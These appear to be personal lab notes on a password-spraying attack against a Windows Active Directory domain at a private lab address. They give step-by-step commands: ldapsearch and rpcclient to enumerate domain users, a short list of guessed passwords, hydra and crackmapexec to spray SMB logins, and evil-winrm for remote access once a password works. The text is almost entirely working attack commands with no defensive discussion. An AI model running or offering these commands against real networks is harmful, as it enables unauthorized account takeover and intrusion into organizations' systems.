# 1) creating user files 
From enumeration we allready gather the inforamation about the users 

ldapsearch -H ldap://192.168.56.107 -x -b"DC=skypia,DC=org"  '(objectClass=User)' "sAMAccountName"| grep "sAMAccountName" 

or 

rpcclient -U "jemmie.blondell" 192.168.56.107

and then typing enumdomuser

I used ldapsearch and then saved only the username using this command:
cut -d':' -f2 input_file > output_file

# 2) Create a password file with a few passwords.

I used since they are simmilar to the two passwords i already know:
qwerty123
happy
summer
passw0rd
winter

# 3) Running spraying attacks for differnet services

hydra -L users.txt -P password.txt -s 445 smb://192.168.56.107

crackmapexec smb 192.168.56.107 -u users.txt -p password.txt --continue-on-success

# 4) repeat a couple of times.
when you get the first password you can use evil-winrm
